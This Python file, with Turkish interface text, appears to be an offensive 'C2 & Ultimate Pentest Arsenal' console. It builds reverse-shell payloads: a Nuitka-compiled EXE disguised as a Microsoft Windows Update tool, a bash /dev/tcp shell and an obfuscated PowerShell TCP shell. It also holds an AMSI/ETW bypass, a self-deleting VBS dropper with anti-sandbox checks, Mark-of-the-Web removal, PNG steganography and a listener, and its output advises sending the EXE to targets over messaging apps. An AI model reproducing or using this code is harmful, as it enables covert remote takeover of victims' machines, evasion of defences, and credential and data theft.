#!/usr/bin/env python3
"""
RedTeam Command & Control (C2) & Ultimate Arsenal
==========================================================
Tüm pentest araçlarını tek bir merkezden yöneten ana konsol.
"""
import os
import sys
import socket
import shutil
import base64
import struct
import zlib
import random
import string
import subprocess

for stream in (sys.stdout, sys.stderr):
    try:
        stream.reconfigure(errors="replace")
    except (AttributeError, ValueError):
        pass

# ANSI Renk Kodları
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{C.RED}{C.BOLD}
    ██▀███  ▓█████ ▓█████▄▄▄█████▓▓█████  ▄▄▄       ███▄ ▄███▓
   ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓  ██▒ ▓▒▓█   ▀ ▒████▄    ▓██▒▀█▀ ██▒
   ▓██ ░▄█ ▒▒███   ░██   █▌▒ ▓██░ ▒░▒███   ▒██  ▀█▄  ▓██    ▓██░
   ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░ ▓██▓ ░ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██ 
   ░██▓ ▒██▒░▒████▒░▒████▓   ▒██▒ ░ ░▒████▒ ▓█   ▓██▒▒██▒   ░██▒
   ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒   ▒ ░░   ░░ ▒░ ░ ▒▒   ▓▒█░░ ▒░   ░  ░
     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒     ░     ░ ░  ░  ▒   ▒▒ ░░  ░      ░
     ░░   ░    ░    ░ ░  ░   ░         ░     ░   ▒   ░      ░   
      ░        ░  ░   ░                ░  ░      ░  ░       ░   
                                                                
        {C.CYAN}--- The Ultimate Pentest Arsenal v5.0 ---{C.RESET}
"""
    print(banner)

def print_line():
    print(f"{C.DIM}{'─' * 65}{C.RESET}")

# ══════════════════════════════════════════════════════════
#  C2: STEGANOGRAFI & ŞİFRELEME YARDIMCILARI
# ══════════════════════════════════════════════════════════

def rand_var(n=8):
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=n-1))

def xor_key(length=32):
    return bytes(random.randint(1, 255) for _ in range(length))

def xor_crypt(data, key):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def make_png_chunk(ctype, cdata):
    raw = ctype + cdata
    return struct.pack('>I', len(cdata)) + raw + struct.pack('>I', zlib.crc32(raw) & 0xffffffff)

def embed_in_png(src_img, payload_text, out_path):
    try:
        with open(src_img, 'rb') as f:
            raw = f.read()

        if raw[:8] != b'\x89PNG\r\n\x1a\n':
            return None, "Geçersiz PNG dosyası!"

        key = xor_key(32)
        enc = xor_crypt(payload_text, key)
        pay_b64 = base64.b64encode(enc).decode()
        key_b64 = base64.b64encode(key).decode()

        ch1 = make_png_chunk(b'tEXt', b'Software\x00Adobe Photoshop CC 2024 ' + key_b64.encode())
        ch2 = make_png_chunk(b'tEXt', b'Comment\x00' + pay_b64.encode())

        iend = raw.rfind(b'IEND')
        if iend == -1:
            return None, "IEND chunk bulunamadı!"
        iend_start = iend - 4
        new_png = raw[:iend_start] + ch1 + ch2 + raw[iend_start:]

        with open(out_path, 'wb') as f:
            f.write(new_png)

        return key_b64, None
    except Exception as e:
        return None, str(e)

def save_text(path, content):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)

def build_evasive_ps(lhost, lport):
    v = {k: rand_var() for k in ['c','s','b','i','d','o','p','x']}
    ps = (
        f"${v['c']}=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"${v['s']}=${v['c']}.GetStream();"
        f"[byte[]]${v['b']}=0..65535|%{{0}};"
        f"while((${v['i']}=${v['s']}.Read(${v['b']},0,${v['b']}.Length)) -ne 0){{"
        f"${v['d']}=(New-Object Text.ASCIIEncoding).GetString(${v['b']},0,${v['i']});"
        f"try{{${v['o']}=(iex ${v['d']} 2>&1|Out-String)}}catch{{${v['o']}=$_.Exception.Message}};"
        f"${v['p']}=${v['o']}+'PS '+$((gl).Path)+'> ';"
        f"${v['x']}=([Text.Encoding]::ASCII).GetBytes(${v['p']});"
        f"${v['s']}.Write(${v['x']},0,${v['x']}.Length);${v['s']}.Flush()}};"
        f"${v['c']}.Close()"
    )
    return ps

def build_amsi_bypass():
    """AMSI bypass + ETW (Event Tracing) patch — log'ları da devre dışı bırakır"""
    amsi = (
        "try{$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
        "$f=$r.GetField(''+[char]97+'msi'+'Init'+'Fai'+'led','NonPublic,Static');"
        "$f.SetValue($null,$true)}catch{}"
    )
    etw = (
        ";try{[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;"
        "$e=[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');"
        "$p=New-Object Diagnostics.Eventing.EventProvider([guid]::NewGuid());"
        "$e.SetValue($p,0)}catch{}"
    )
    return amsi + etw

def build_standalone_vbs(key_b64, pay_b64, anti_sandbox=True):
    """Tek dosya: Key ve payload doğrudan VBS içine gömülü, harici dosya gerekmez."""
    vbs = "On Error Resume Next\n"

    if anti_sandbox:
        vbs += '''
' ── Zamanlama Kontrolü (hızlandırılmış sandbox tespiti) ──
Dim t1, t2
t1 = Timer
WScript.Sleep 1500
t2 = Timer
If (t2 - t1) < 1 Then WScript.Quit

' ── VM / Sanal Makine Kontrolü ──
Set wmi = GetObject("winmgmts:")
Set items = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")
For Each item In items
    Dim mfr, mdl
    mfr = LCase(item.Manufacturer)
    mdl = LCase(item.Model)
    If InStr(mfr,"vmware")>0 Or InStr(mfr,"virtualbox")>0 Or InStr(mfr,"xen")>0 Or InStr(mdl,"virtual")>0 Then
        WScript.Quit
    End If
Next

' ── Analiz Aracı Tespiti ──
Dim procs, proc
Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
Dim blacklist
blacklist = Array("wireshark","procmon","procexp","x64dbg","x32dbg","ollydbg","ida","fiddler","httpdebuggerpro","dnspy","pestudio","processhacker")
For Each proc In procs
    Dim pn
    pn = LCase(proc.Name)
    Dim bl
    For Each bl In blacklist
        If InStr(pn, bl) > 0 Then WScript.Quit
    Next
Next

' ── Ekran & RAM Kontrolü ──
Set sh = CreateObject("WScript.Shell")
Dim scrW
scrW = sh.RegRead("HKCU\\Control Panel\\Desktop\\ScreenWidth")
If CInt(scrW) < 1024 Then WScript.Quit
Dim mem
For Each item In wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
    mem = CLng(item.TotalPhysicalMemory / 1073741824)
Next
If mem < 2 Then WScript.Quit

' ── Rastgele Gecikme (3-8s) ──
Randomize
WScript.Sleep Int((8000 - 3000 + 1) * Rnd + 3000)
'''
    else:
        vbs += '''
Set sh = CreateObject("WScript.Shell")
'''

    # Görseli aç (şüphe uyandırmasın) + Key ve payload'ı doğrudan VBS'e göm
    vbs += f'''
' ── Görseli Aç (masum görüntüsü) ──
Dim myDir
myDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
sh.Run """" & myDir & "photo.png" & """", 1, False

' ── Gömülü Payload (Base64 + XOR Şifreli) ──
Dim keyB64, payB64
keyB64 = "{key_b64}"
payB64 = "{pay_b64}"

' ── Base64 Decode ──
Dim xml1
Set xml1 = CreateObject("MSXML2.DOMDocument")
Dim node1
Set node1 = xml1.createElement("b64")
node1.DataType = "bin.base64"

node1.Text = keyB64
Dim keyBytes
keyBytes = node1.nodeTypedValue

node1.Text = payB64
Dim payBytes
payBytes = node1.nodeTypedValue

' ── XOR Çözümleme ──
Dim keyLen, payLen
keyLen = LenB(keyBytes)
payLen = LenB(payBytes)
Dim result
result = ""
Dim idx
For idx = 1 To payLen
    Dim pb, kb
    pb = AscB(MidB(payBytes, idx, 1))
    kb = AscB(MidB(keyBytes, ((idx - 1) Mod keyLen) + 1, 1))
    result = result & Chr(pb Xor kb)
Next

'''
    # Çalıştırma
    if anti_sandbox:
        vbs += '''
' ── Gizli PowerShell Çalıştır ──
Dim wmiProc
Set wmiProc = GetObject("winmgmts:Win32_Process")
wmiProc.Create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """", Null, Null, Null

' ── Kendini Sil ──
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName, True
'''
    else:
        vbs += '''
' ── PowerShell Çalıştır ──
Dim psCmd
psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """"
sh.Run psCmd, 0, False
'''

    return vbs

# ══════════════════════════════════════════════════════════
#  C2 MENÜLERİ
# ══════════════════════════════════════════════════════════

def c2_payload_builder():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] C2 Payload Builder{C.RESET}\n")
    print_line()
    print(f"{C.DIM}  [!] Önerilen Portlar: 443 (HTTPS), 80 (HTTP), 53 (DNS) - Güvenlik duvarlarını aşmak için{C.RESET}\n")

    lhost = input(f"{C.CYAN}  [?] LHOST (Saldırgan IP)   : {C.RESET}").strip()
    lport = input(f"{C.CYAN}  [?] LPORT (Saldırgan Port) : {C.RESET}").strip()

    if not lhost or not lport:
        print(f"{C.RED}  [-] Hata: Geçersiz IP veya Port.{C.RESET}")
        input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
        return

    print_line()
    print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
    print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload)")
    print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell)")

    os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()

    if os_choice == '1':
        print_line()

        anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
        anti_sb = False if anti_sb_input == 'h' else True

        exe_name = input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup"

        print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor...{C.RESET}")

        # Reverse shell Python scripti oluştur
        output_dir = "stealth_dropper"
        os.makedirs(output_dir, exist_ok=True)
        stub_path = os.path.join(output_dir, "_stub.py")

        anti_sb_code = ""
        if anti_sb:
            anti_sb_code = """
import ctypes, time
# Zamanlama kontrolü
t1 = time.time()
time.sleep(1.5)
if time.time() - t1 < 1:
    raise SystemExit
# VM kontrolü
try:
    import subprocess as _sp
    _r = _sp.run(['wmic','computersystem','get','manufacturer,model'],capture_output=True,text=True)
    _o = _r.stdout.lower()
    for _v in ['vmware','virtualbox','xen','virtual']:
        if _v in _o:
            raise SystemExit
except:
    pass
# Analiz aracı kontrolü
try:
    _r = _sp.run(['tasklist'],capture_output=True,text=True)
    _t = _r.stdout.lower()
    for _b in ['wireshark','procmon','x64dbg','ollydbg','ida','fiddler','processhacker']:
        if _b in _t:
            raise SystemExit
except:
    pass
"""

        # Nuitka native C'ye derlediği için XOR'a gerek yok — kod zaten native binary'de gizli
        stub_code = f"""import socket,os,time,sys
import subprocess as _sp
import shutil
try:
    if sys.stdout is None: sys.stdout=open(os.devnull,"w")
    if sys.stderr is None: sys.stderr=open(os.devnull,"w")
except: pass
{anti_sb_code}
def _r():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(60)
            s.connect(("{lhost}",{lport}))
            s.settimeout(None)
            while True:
                d=s.recv(4096)
                if not d:break
                cmd=d.decode("utf-8","replace").strip()
                if not cmd:continue
                try:
                    p=_sp.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
                    o=p.stdout+p.stderr
                    if not o:o="\\n"
                except Exception as e:
                    o=str(e)+"\\n"
                try:
                    o+=os.getcwd()+"> "
                except:
                    o+="> "
                s.sendall(o.encode("utf-8","replace"))
            s.close()
        except:
            pass
        time.sleep(5)
_r()
"""
        save_text(stub_path, stub_code)

        print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu biraz sürebilir)...{C.RESET}")

        # Nuitka ile derle (native C — AV tespiti çok düşük)
        exe_out = os.path.join(output_dir, exe_name + ".exe")
        result = subprocess.run(
            [sys.executable, "-m", "nuitka",
             "--onefile", "--windows-console-mode=disable",
             "--output-dir=" + output_dir,
             "--output-filename=" + exe_name + ".exe",
             "--remove-output",
             "--assume-yes-for-downloads",
             "--windows-company-name=Microsoft Corporation",
             "--windows-product-name=Windows Update Service",
             "--windows-file-version=10.0.26200.1",
             "--windows-product-version=10.0.26200.1",
             "--windows-file-description=Windows Update Assistant",
             stub_path],
            capture_output=True, text=True
        )

        # Temizlik
        for cleanup in [stub_path,
                        os.path.join(output_dir, "_stub.build"),
                        os.path.join(output_dir, "_stub.onefile-build"),
                        os.path.join(output_dir, "_stub.dist")]:
            if cleanup and os.path.exists(cleanup):
                try:
                    if os.path.isdir(cleanup):
                        shutil.rmtree(cleanup, ignore_errors=True)
                    else:
                        os.remove(cleanup)
                except:
                    pass

        if os.path.exists(exe_out):
            # MOTW (Mark of the Web) sil — SmartScreen bypass
            try:
                motw_path = exe_out + ':Zone.Identifier'
                if os.path.exists(motw_path):
                    os.remove(motw_path)
            except: pass
            # PowerShell ile de temizle
            subprocess.run(['powershell', '-c',
                f'Remove-Item -Path "{os.path.abspath(exe_out)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
                capture_output=True)

            exe_size = os.path.getsize(exe_out) / (1024*1024)
            print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
            print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
            print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
            print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
            print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
            print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
            print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
            print(f"{C.WHITE}  🔧 Derleyici: Nuitka (Native C){C.RESET}")
            print(f"{C.WHITE}  🛡️  MOTW    : Temizlendi ✅{C.RESET}")
            print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
            print(f"{C.YELLOW}  [!] SmartScreen bypass: WhatsApp/Telegram/USB ile gönderin.{C.RESET}")
            print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")

            # Klasörü otomatik aç
            if os.name == 'nt':
                os.startfile(os.path.abspath(output_dir))
        else:
            print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
            if result.stderr:
                print(f"{C.RED}  [-] Hata: {result.stderr[:500]}{C.RESET}")
            if result.stdout:
                print(f"{C.DIM}  {result.stdout[-500:]}{C.RESET}")
            print(f"{C.YELLOW}  [!] Nuitka kurulu mu? 'pip install nuitka' ile kurun.{C.RESET}")

    elif os_choice == '2':
        payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        save_text("linux_payload.sh", payload)
        print(f"\n{C.GREEN}[+] Linux Payload oluşturuldu: linux_payload.sh{C.RESET}")
    
    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

def c2_listener():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] C2 Listener (Dinleyici){C.RESET}\n")
    print_line()
    print(f"{C.DIM}  [!] Önerilen Portlar: Payload'da belirttiğiniz port (ör: 443, 80, 53){C.RESET}\n")

    port_str = input(f"{C.CYAN}  [?] Dinlenecek Port: {C.RESET}").strip()
    if not port_str.isdigit():
        return

    port = int(port_str)
    print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (İptal: CTRL+C){C.RESET}\n")

    conn = None
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)

        conn, addr = s.accept()
        conn.settimeout(30)
        print(f"{C.RED}{C.BOLD}  [!] BAĞLANTI GELDİ: {addr[0]}:{addr[1]}{C.RESET}\n")

        while True:
            try:
                cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                if len(cmd) > 0:
                    conn.sendall(cmd.encode("utf-8") + b"\n")
                    # Yanıtı tam al
                    response = b""
                    while True:
                        try:
                            chunk = conn.recv(4096)
                            if not chunk:
                                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                                break
                            response += chunk
                            if b"> " in chunk:
                                break
                        except socket.timeout:
                            break
                    if response:
                        print(f"{C.WHITE}{response.decode('utf-8', errors='replace')}{C.RESET}", end="")
                    else:
                        break
            except (ConnectionResetError, BrokenPipeError):
                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                break
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}  [*] Dinleme iptal edildi.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}  [-] Hata: {e}{C.RESET}")
    finally:
        if conn: conn.close()
        if s: s.close()

    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

# ══════════════════════════════════════════════════════════
#  EXTERNAL TOOLS EXECUTOR
# ══════════════════════════════════════════════════════════

def run_external_tool(script_path, desc):
    clear_screen()
    print_banner()
    print(f"{C.MAGENTA}[*] Çalıştırılıyor: {desc}{C.RESET}\n")
    print_line()
    
    if not os.path.exists(script_path):
        print(f"{C.RED}\n[-] Dosya bulunamadı: {script_path}{C.RESET}")
        input(f"\n{C.YELLOW}  Geri dönmek için Enter'a basın...{C.RESET}")
        return

    args = ""
    if "Evil_Twin.py" in script_path:
        print(f"\n{C.YELLOW}{C.BOLD}  [*] Gelişmiş Evil Twin (Sahte AP) Kurulum Sihirbazı{C.RESET}")
        print(f"{C.DIM}  =============================================================={C.RESET}")
        print(f"  {C.CYAN}[ℹ] Evil Twin, hedefin WiFi ağının kopyasını oluşturarak{C.RESET}")
        print(f"  {C.CYAN}    kullanıcıları sahte ağa (Captive Portal) yönlendirir.{C.RESET}")
        print(f"  {C.CYAN}[!] Önerilen Ayarlar:{C.RESET}")
        print(f"  {C.CYAN}    - Hedef ağın kanalıyla (Channel) aynı kanalı kullanın.{C.RESET}")
        print(f"  {C.CYAN}    - Captive Portal otomatik olarak Port 80'de (HTTP) çalışır.{C.RESET}")
        print(f"{C.DIM}  =============================================================={C.RESET}\n")
        
        iface = input(f"  {C.CYAN}[?] İzleme Destekli WiFi Arayüzü {C.DIM}[wlan0]{C.RESET}: ").strip() or "wlan0"
        ssid = input(f"  {C.CYAN}[?] Taklit Edilecek Ağ Adı (SSID) {C.DIM}[FreeWiFi]{C.RESET}: ").strip() or "FreeWiFi"
        kanal = input(f"  {C.CYAN}[?] WiFi Kanalı {C.DIM}[6]{C.RESET}: ").strip() or "6"
        
        if iface and ssid:
            args = f"{iface} {ssid} {kanal}".strip()
    
    elif "Reverse_Shell_Gen.py" in script_path:
        print(f"{C.YELLOW}  [*] Reverse Shell Generator Sihirbazı{C.RESET}")
        ip = input(f"  {C.CYAN}[?] LHOST (Saldırgan IP): {C.RESET}").strip()
        port = input(f"  {C.CYAN}[?] LPORT (Saldırgan Port): {C.RESET}").strip()
        lang = input(f"  {C.CYAN}[?] Dil (Opsiyonel, boş bırakın veya python/bash yazın): {C.RESET}").strip()
        if ip and port:
            args = f"{ip} {port} {lang}".strip()

    elif "Wordlist_Generator.py" in script_path:
        print(f"{C.DIM}Bu araç kendi içinde interaktiftir, doğrudan başlatılıyor...{C.RESET}\n")
        args = ""

    elif "Log_Cleaner.py" in script_path:
        print(f"{C.DIM}Bu araç argüman gerektirmez, doğrudan başlatılıyor...{C.RESET}\n")
        args = ""

    else:
        print(f"{C.DIM}Bu aracın argüman gerektirip gerektirmediğini görmek için boş bırakıp Enter'a basabilirsiniz.{C.RESET}\n")
        args = input(f"{C.CYAN}  [?] Argümanları girin (ör: <IP> <PORT> veya -h): {C.RESET}").strip()
    
    print_line()
    print(f"{C.GREEN}[+] Araç Çıktısı Başlıyor...{C.RESET}\n")
    
    cmd = [sys.executable, script_path] + args.split()
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Kullanıcı tarafından durduruldu.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}[-] Çalıştırma hatası: {e}{C.RESET}")
        
    print(f"\n{C.GREEN}[+] Araç Çıktısı Bitti.{C.RESET}")
    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

def external_menu_category(title, tools):
    while True:
        clear_screen()
        print_banner()
        print(f"{C.BOLD}  {title.upper()}:{C.RESET}\n")
        
        for i, (name, path, desc, color) in enumerate(tools, 1):
            print(f"  {C.CYAN}{i}){C.RESET} {color}{name:<25}{C.RESET} {C.DIM}— {desc}{C.RESET}")
        print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")

        try:
            choice = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
            
            if choice == '0':
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(tools):
                tool = tools[int(choice)-1]
                run_external_tool(tool[1], tool[0])
            else:
                print(f"{C.RED}  [-] Geçersiz seçim.{C.RESET}")
        except KeyboardInterrupt:
            break

# ══════════════════════════════════════════════════════════
#  ANA MENÜ YÖNETİMİ
# ══════════════════════════════════════════════════════════

def main_menu():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Tool Definitions: (Display Name, Relative Path, Description)
    recon_tools = [
        ("Network Scanner", os.path.join(base_dir, "Network Recon", "Network_Scanner.py"), "ARP ve ICMP yerel ağ taraması", C.GREEN),
        ("DNS Enumerator", os.path.join(base_dir, "Network Recon", "DNS_Enumerator.py"), "DNS kayıtları ve Subdomain Brute-Force", C.YELLOW),
        ("ARP Spoofer", os.path.join(base_dir, "Network Recon", "ARP_Spoofer.py"), "Yerel ağda Ortadaki Adam (MitM) saldırısı", C.RED)
    ]
    
    web_tools = [
        ("SQLi Tester", os.path.join(base_dir, "Web Exploitation", "SQLi_Tester.py"), "Temel SQL Injection tespiti", C.YELLOW),
        ("XSS Scanner", os.path.join(base_dir, "Web Exploitation", "XSS_Scanner.py"), "Reflected XSS tespiti", C.YELLOW),
        ("Directory Bruteforcer", os.path.join(base_dir, "Web Exploitation", "Directory_Bruteforcer.py"), "Gizli dizin ve dosya bulucu", C.YELLOW),
        ("LFI Scanner", os.path.join(base_dir, "Web Exploitation", "LFI_Scanner.py"), "Local File Inclusion tarayıcı", C.RED)
    ]
    
    pwd_tools = [
        ("Wordlist Generator", os.path.join(base_dir, "Password Cracking", "Wordlist_Generator.py"), "Hedef odaklı özel şifre listesi üret", C.GREEN),
        ("Hash Identifier", os.path.join(base_dir, "Password Cracking", "Hash_Identifier.py"), "Hash formatını belirle", C.GREEN),
        ("MD5 Hash Cracker", os.path.join(base_dir, "Password Cracking", "Hash_Cracker.py"), "Wordlist ile MD5 kırma", C.YELLOW),
        ("ZIP Password Cracker", os.path.join(base_dir, "Password Cracking", "Zip_Cracker.py"), "Şifreli ZIP dosyalarını kırma", C.YELLOW),
        ("SSH Bruteforce", os.path.join(base_dir, "Password Cracking", "SSH_Bruteforce.py"), "SSH login denemeleri", C.RED),
        ("FTP Bruteforce", os.path.join(base_dir, "Password Cracking", "FTP_Bruteforce.py"), "FTP login denemeleri", C.RED)
    ]
    
    post_tools = [
        ("Reverse Shell Generator", os.path.join(base_dir, "Post-Exploitation", "Reverse_Shell_Gen.py"), "12 dilde hazır shell kodu üret", C.GREEN),
        ("Credential Harvester", os.path.join(base_dir, "Post-Exploitation", "Credential_Harvester.py"), "WiFi şifreleri ve sistem bilgisi", C.YELLOW),
        ("Screenshot Grabber", os.path.join(base_dir, "Post-Exploitation", "Screenshot_Grabber.py"), "Hedef ekrandan görüntü alma", C.YELLOW),
        ("Simple Keylogger", os.path.join(base_dir, "Post-Exploitation", "Simple_Keylogger.py"), "Klavye vuruşlarını kaydetme", C.RED),
        ("Data Exfiltrator", os.path.join(base_dir, "Post-Exploitation", "Data_Exfiltrator.py"), "B64/HTTP ile veri sızdırma", C.RED),
        ("Persistence Installer", os.path.join(base_dir, "Post-Exploitation", "Persistence_Installer.py"), "Kalıcılık sağlama (Registry/Cron)", C.RED),
        ("Log Cleaner", os.path.join(base_dir, "Post-Exploitation", "Log_Cleaner.py"), "İz silme — Windows/Linux log temizleyici", C.RED)
    ]
    
    priv_tools = [
        ("Linux PrivEsc Checker", os.path.join(base_dir, "Privilege Escalation", "Linux_PrivEsc_Checker.py"), "Linux yetki yükseltme vektörleri taraması", C.GREEN),
        ("Windows PrivEsc Checker", os.path.join(base_dir, "Privilege Escalation", "Windows_PrivEsc_Checker.bat"), "Windows yetki yükseltme (Bat script)", C.GREEN)
    ]
    
    av_tools = [
        ("Payload Obfuscator", os.path.join(base_dir, "AV Evasion", "Payload_Obfuscator.py"), "Python scriptlerini gizleme", C.YELLOW),
        ("Shellcode Encoder", os.path.join(base_dir, "AV Evasion", "Shellcode_Encoder.py"), "XOR ile Shellcode şifreleme", C.YELLOW)
    ]

    wireless_tools = [
        ("Evil Twin", os.path.join(base_dir, "Wireless Attacks", "Evil_Twin.py"), "Sahte WiFi AP + Captive Portal (Linux)", C.RED)
    ]

    while True:
        clear_screen()
        print_banner()
        print(f"{C.BOLD}  RİSK BİLGİLENDİRMESİ:{C.RESET}")
        print(f"  {C.GREEN}■ DÜŞÜK RİSK{C.RESET}  : Tespit/Kontrol araçları. İz bırakmaz.")
        print(f"  {C.YELLOW}■ ORTA RİSK{C.RESET}   : Tarayıcılar/Bruteforce. Log bırakabilir.")
        print(f"  {C.RED}■ YÜKSEK RİSK{C.RESET} : İstismar/Kalıcılık/C2. Doğrudan müdahale.\n")
        print(f"{C.DIM}{'─' * 65}{C.RESET}\n")

        print(f"{C.BOLD}  KATEGORİLER:{C.RESET}\n")
        
        print(f"  {C.CYAN}1){C.RESET} {C.GREEN}Privilege Escalation{C.RESET} {C.DIM}— Windows/Linux PrivEsc Checker{C.RESET}")
        print(f"  {C.CYAN}2){C.RESET} {C.GREEN}AV Evasion{C.RESET}           {C.DIM}— Obfuscator, Shellcode Encoder{C.RESET}")
        print(f"  {C.CYAN}3){C.RESET} {C.YELLOW}Network Recon{C.RESET}        {C.DIM}— Ağ tarama, DNS, ARP Spoofing{C.RESET}")
        print(f"  {C.CYAN}4){C.RESET} {C.YELLOW}Web Exploitation{C.RESET}     {C.DIM}— SQLi, XSS, LFI, Dir Buster{C.RESET}")
        print(f"  {C.CYAN}5){C.RESET} {C.YELLOW}Password Cracking{C.RESET}    {C.DIM}— Wordlist, Hash, SSH/FTP Brute{C.RESET}")
        print(f"  {C.CYAN}6){C.RESET} {C.RED}Post-Exploitation{C.RESET}    {C.DIM}— Shell Gen, Keylogger, Log Cleaner{C.RESET}")
        print(f"  {C.CYAN}7){C.RESET} {C.RED}Wireless Attacks{C.RESET}     {C.DIM}— Evil Twin, Sahte WiFi AP{C.RESET}")
        print(f"  {C.CYAN}8){C.RESET} {C.RED}C2 Framework{C.RESET}         {C.DIM}— Payload Builder & Listener (Stealth){C.RESET}")
        print(f"  {C.CYAN}0){C.RESET} Çıkış\n")

        try:
            choice = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
        except KeyboardInterrupt:
            clear_screen()
            print(f"{C.RED}  [*] The Ultimate Pentest Arsenal kapatılıyor... İyi avlar!{C.RESET}\n")
            sys.exit(0)

        if choice == '1':
            external_menu_category("Privilege Escalation", priv_tools)
        elif choice == '2':
            external_menu_category("AV Evasion", av_tools)
        elif choice == '3':
            external_menu_category("Network Recon", recon_tools)
        elif choice == '4':
            external_menu_category("Web Exploitation", web_tools)
        elif choice == '5':
            external_menu_category("Password Cracking", pwd_tools)
        elif choice == '6':
            external_menu_category("Post-Exploitation", post_tools)
        elif choice == '7':
            external_menu_category("Wireless Attacks", wireless_tools)
        elif choice == '8':
            while True:
                clear_screen()
                print_banner()
                print(f"{C.BOLD}  C2 FRAMEWORK:{C.RESET}\n")
                print(f"  {C.CYAN}1){C.RESET} Payload Builder (Tek PNG / Shell)")
                print(f"  {C.CYAN}2){C.RESET} Listener (Saldırgan Dinleyicisi)")
                print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")
                try:
                    c2c = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
                except KeyboardInterrupt:
                    break

                if c2c == '1': c2_payload_builder()
                elif c2c == '2': c2_listener()
                elif c2c == '0': break
        elif choice == '0':
            clear_screen()
            print(f"{C.RED}  [*] The Ultimate Pentest Arsenal kapatılıyor... İyi avlar!{C.RESET}\n")
            sys.exit(0)

if __name__ == "__main__":
    main_menu()
